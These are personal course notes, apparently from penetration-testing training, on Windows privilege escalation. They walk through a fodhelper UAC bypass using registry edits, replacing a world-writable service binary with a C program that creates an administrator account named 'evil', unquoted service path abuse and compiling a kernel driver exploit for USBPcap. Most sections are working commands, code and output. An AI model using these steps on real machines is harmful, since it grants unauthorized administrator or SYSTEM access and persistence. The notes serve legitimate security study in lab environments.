

HKCR contains file name extension associations and COM class registration information such as ProgIDs, CLSIDs, and IIDs  
  
  
To view user's Integrity Level:  
```powershell
C:\Users\admin>whoami /groups  
  
GROUP INFORMATION  
-----------------  
  
Group Name                              Type             SID          Attributes  
======================================================== ============ ================  
Everyone                                Well-known group S-1-1-0      Mandatory group,  
NT AUTHORITY\Local account and member   Well-known group S-1-5-114    Group used for d  
BUILTIN\Administrators                  Alias            S-1-5-32-544 Group used for d  
BUILTIN\Users                           Alias            S-1-5-32-545 Mandatory group,  
NT AUTHORITY\INTERACTIVE                Well-known group S-1-5-4      Mandatory group,  
...  
Mandatory Label\Medium Mandatory Level  Label            S-1-16-8192
```
	As shown, we're logged in as ‘admin’ and currently have a Medium Integrity Level (Line 14)  
  
  
If we were to try to change the admin's password, it wouldn't work:  
```powershell
C:\Users\admin> net user admin Ev!lpass  
System error 5 has occurred.  
  
Access is denied.
```


### sc:

Will get NT AUTHORITY/SYSTEM rights:
```powershell
sc create <service_name> binpath= "<full_path\binary>" type= own type= interact
sc start <service_name>
```


### runAs:

Switch to High Integrity Level:  
```powershell
C:\Users\admin>powershell.exe Start-Process cmd.exe -Verb runAs
```


Retrying:  
```powershell
C:\Windows\system32> whoami /groups  
  
GROUP INFORMATION  
-----------------  
  
Group Name                              Type             SID          Attributes  
======================================================== ============ ================  
Everyone                                Well-known group S-1-1-0      Mandatory group,  
NT AUTHORITY\Local account and member   Well-known group S-1-5-114    Mandatory group,  
BUILTIN\Administrators                  Alias            S-1-5-32-544 Mandatory group,  
BUILTIN\Users                           Alias            S-1-5-32-545 Mandatory group,  
...  
Mandatory Label\High Mandatory Level    Label            S-1-16-12288  
  
C:\Windows\system32> net user admin Ev!lpass  
The command completed successfully.
```



### Another way to bypass is [fodhelper.exe](fodhelper.exe.md)  
  
\*\*\*NOTE: had to be admin; student didn't have perms for **fodhelper.exe** nor **procmon.exe**  
  
Use [sigcheck.exe](sigcheck.exe.md) to inspect the app's _application manifest_ to determine integrity level & pers required to run it:  
```powershell
C:\> cd C:\Tools\privilege_escalation\SysinternalsSuite  
  
C:\Tools\privilege_escalation\SysinternalsSuite> sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe  
  
c:\windows\system32\fodhelper.exe:  
Verified:       Signed  
Signing date:   4:40 AM 9/29/2017  
...  
<requestedPrivileges>  
<requestedExecutionLevel  
level="requireAdministrator"  
...  
<autoElevate>true</autoElevate>  
</asmv3:windowsSettings>  
 </asmv3:application>  
</assembly>
```
.
	**-a** - Extended info  
	**-m** - Dump Manifest  
	(Line 11) - Meant to be run by admin users (req full admin access token)  
	(Line 13) - Allows executable to auto-elevate to _High Integrity_ w/o prompting from admin user for consent  
  
  
Gather more info about fodhelper as it executes:  
1. Start procmon.exe  
2. Run fodhelper.exe  
3. Set filters to:
	1. Process Name - Is - fodhelper.exe - then - Include
	2. Operation - Contains - Reg - then - Include
	3. Result - Is - NAME NOT FOUND - then - Include
	4. Path - Contains - HKCU - then - Include
	5. Path - Contains - ms-settings\\shell\\open\\command - then - Include
  
2 - We're looking for reg entries that don't exist that fodhelper is attempting to access  
	- May be able to tamper w/ the entries & interfere w/ acitons the _High-Integrity_ process is attempting to perform.  
	  
  
3 - Search for the Reg Hive we can control w/ read/ write access - HKCU (hkey_current_user)  

4- One particular result: HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command  
  
To figure why it's trying to access that key, change filter 4^:  
  
5- Results show that after attempting to mod that key, not finding it, it then successfully finds it in the HKEY_CLASSES_ROOT (HKCR) hive  
  
Steps:  
1. Add key in HKCU hive (where it looks for it first)  
2. Add empty value for _DelegateExecute_ to force execution from COM object to program  
3. Add our binary under _Default_ value  
  
1. Add the missing key w/ reg in order to abuse it:  
```powershell
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
```
![[reg_key.png]]

To ensure we don't hijack execution through the COM object, we'll add an empty entry for _DelegateExecute_.
	fodhelper discovers the empty value, follows the specs for _application protocols_ & will look for a program in the _Default_ key  
  
  
2. Add empty value to _DelegateExecute_:  
```powershell
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
```
.
	**/v** - Value name  
	**/t** - Type  
  
To verify, remove filter 3^ and change to:  
Result - Is - SUCCESS - then - Include  
  
  
3. Add our own executable (cmd.exe) to _Default_ key:  
```powershell
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
```
.  
	**/d** - Specify new registry key value  
	**/f** - Add value silently  
  
Running fodhelper again will throw a High-Integrity cmd shell  



### Insecure File Perms

Exploit services that run as _nt authority\\system_.  
```powershell
PS C:\Users\student> Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}  
  
Name                  State   PathName  
----                  -----   --------  
...  
RpcSs                 Running C:\Windows\system32\svchost.exe -k rpcss  
SamSs                 Running C:\Windows\system32\lsass.exe  
Serviio               Running C:\Program Files\Serviio\bin\ServiioService.exe  
ShellHWDetection      Running C:\Windows\System32\svchost.exe -k netsvcs  
...
```

Serviio service stands out as it's installed in the Program Files directory.  

Meaning the service is user-installed & the software dev is in charge of the dir structure as well as perms of the software.  

Makes it more prone to privesc.  
  
  
Enum the service's perms w/ [icacls](icacls.md)  
```powershell
C:\Users\student> icacls "C:\Program Files\Serviio\bin\ServiioService.exe"  
C:\Program Files\Serviio\bin\ServiioService.exe BUILTIN\Users:(I)(F)  
NT AUTHORITY\SYSTEM:(I)(F)  
BUILTIN\Administrators:(I)(F)  
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  
  
Successfully processed 1 files; Failed processing 0 files
```

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

Any user (BUILTIN\\Users) on the system has full read and write access to it.  
  
To exploit, replace ServiioService.exe with our own malicious binary and then trigger it by restarting the service or rebooting the machine.  
  
Ex:  
```c
#include <stdlib.h>  
  
int main ()  
{  
  int i;  
    
  i = system ("net user evil Ev!lpass /add");  
  i = system ("net localgroup administrators evil /add");  
  i = system ("net localgroup 'Remote Desktop Users' evil /add");  
    
  return 0;  
}
```
	Create a user named "evil" and add that user to the local Administrators group using the _system_ function.  
  
We'll need to cross-compile on kali:  
```bash
i686-w64-mingw32-gcc adduser.c -o adduser.exe
```

  
  
Transfer and replace OG binary:  
```powershell
C:\Users\student> move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"  
1 file(s) moved.  
  
C:\Users\student> move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"  
1 file(s) moved.  
  
C:\Users\student> dir "C:\Program Files\Serviio\bin\"  
Volume in drive C has no label.  
Volume Serial Number is 56B9-BB74  
  
Directory of C:\Program Files\Serviio\bin  
  
01/26/2018  07:21 AM    <DIR>          .  
01/26/2018  07:21 AM    <DIR>          ..  
12/04/2016  08:30 PM               867 serviio.bat  
01/26/2018  07:19 AM            48,373 ServiioService.exe  
12/04/2016  08:30 PM                10 ServiioService.exe.vmoptions  
12/04/2016  08:30 PM           413,696 ServiioService_original.exe  
4 File(s)        462,946 bytes  
2 Dir(s)   3,826,667,520 bytes free
```


As most services are managed by administrative users, we can't restart the service:  
```powershell
C:\Users\student> net stop Serviio  
System error 5 has occurred.  
  
Access is denied.
```


Check start options of the service:  
```powershell
C:\Users\student>wmic service where caption="Serviio" get name, caption, state, startmode  
Caption  Name     StartMode  State  
Serviio  Serviio  Auto       Running
```


Check if our user has reboot rights:  
```powershell
C:\Users\student>whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                          State  
============================= ==================================== ========  
SeShutdownPrivilege           Shut down the system                 Disabled  
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled  
SeUndockPrivilege             Remove computer from docking station Disabled  
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled  
SeTimeZonePrivilege           Change the time zone                 Disabled
```
	**_Disabled_ state only indicates if the privilege is currently enabled for the running process (whoami).  
  
Reboot:  
```powershell
shutdown /r /t 0
```


Log back in with username "evil" with a password of "Ev!lpass" & check perms:  
```powershell
C:\Users\evil> net localgroup Administrators  
Alias name     Administrators  
Comment   Administrators have complete and unrestricted access to the computer/domain  
  
Members  
  
-------------------------------------------------------------------------------  
admin  
Administrator  
corp\Domain Admins  
corp\offsec  
evil  
The command completed successfully.
```



### Unquoted Service Paths:

We can use this attack when we have write permissions to a service's main directory & subdirectories but cannot replace files within them.  
  
When using file or directory paths that contain spaces, the developers should always ensure that they are enclosed by quotation marks.  

This ensures that they are explicitly declared. However, when that is not the case and a path name is unquoted, it is open to interpretation.  

Specifically, in the case of executable paths, anything that comes after each whitespace character will be treated as a potential argument or option for the executable.  
  
  
Ex:  
A service stored in a path such as _C\:\\Program Files\\My Program\\My Service\\service.exe_.

If the service path is stored unquoted, whenever Windows starts the service it will attempt to run an executable from the following paths:  
  
	C:\Program.exe  
	C:\Program Files\My.exe  
	C:\Program Files\My Program\My.exe  
	C:\Program Files\My Program\My service\service.exe  
  
So, could craft the malicious binary, name it My.exe, and store it in either the _C\:\\Program Files\\_ or _C\:\\Program Files\\My Program\\_ paths  
  
Ex:  
Service name/ path is _C\:\\Program Files\\My Program\\My Service\\service.exe_  
```powershell
move evil.exe "C:\Program Files\My Program\my.exe
```



### Kernel Vulns

When attempting to exploit system-level software (such as drivers or the kernel itself),  
we must pay careful attention to several factors including the target's operating system, version, and architecture.  
Failure to accurately identify these factors can trigger a BSOD  
  
* 3rd party kernel drivers are easier to exploit than the OS's kernel itself. (Vigorous patch cycle)  
** Even drivers marked as Stopped can be interacted with as they're still loaded into kernel memory space.  
*** Driver directory is typically: _C\:\\Windows\\System32\\DRIVERS_  
  
  
Determine version & architecture:  
```powershell
C:\> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"  
OS Name:                   Microsoft Windows 7 Professional  
OS Version:                6.1.7601 Service Pack 1 Build 7601  
System Type:               X86-based PC
```


Determine drivers:  
```powershell
C:\Users\student\Desktop>driverquery /v  
  
Module Name  Display Name           Description            Driver Type   Start M  
ode State      Status     Accept Stop Accept Pause Paged Pool Code(bytes BSS(by  
Link Date              Path                                             Init(byt  
es  
============ ====================== ====================== ============= =======  
...  
  USBPcap      USBPcap Capture Servic USBPcap Capture Servic Kernel        Manual  
    Stopped    OK         FALSE       FALSE        7,040      9,600      0  
10/2/2015 2:08:15 AM   C:\Windows\system32\DRIVERS\USBPcap.sys          2,176  
...
```
	Fairly certain 3rd party drivers don't have _Microsoft_ attached to their listing.  
  
  
Search for exploit:  
```bash
kali@kali:~# searchsploit USBPcap  
--------------------------------------- ----------------------------------------  
 Exploit Title                         |  Path  
                                       | (/usr/share/exploitdb/)  
--------------------------------------- ----------------------------------------  
USBPcap 1.1.0.0 (WireShark 2.2.5) - Lo | exploits/windows/local/41542.c  
--------------------------------------- ----------------------------------------

```

Verify installed version of driver to match 1.1.0.0:  
```powershell
C:\Users\n00b> cd "C:\Program Files"  
  
C:\Program Files> dir  
...  
08/13/2015  04:04 PM    <DIR>          MSBuild  
07/14/2009  06:52 AM    <DIR>          Reference Assemblies  
01/24/2018  02:30 AM    <DIR>          USBPcap
```


Inspect contents of _USBPcap\\USBPcap.inf_:  
```powershell
C:\Program Files\USBPcap> type USBPcap.inf  
[Version]  
Signature           = "$WINDOWS NT$"  
Class               = USB  
ClassGuid           = {36FC9E60-C465-11CF-8056-444553540000}  
...  
DriverVer=10/02/2015,1.1.0.0  
```


Compile C coded exploit:  
	**Ideally, we would compile the code on the platform version it is intended to run on.  
	In those cases, we would simply create a virtual machine that matches our target and compile the code there.  
  
We can attempt to get [mingw-w64.bat](mingw-w64.md) on the Win vic, run it (giving us gcc & adding it as a PATH var), and compile our exploit's code there:  
```powershell
gcc 41542.c -o exploit.exe
```
** May produce [error messages](https://gcc.gnu.org/onlinedocs/gcc/Warnings-and-Errors.html). Review carefully as it might have still worked.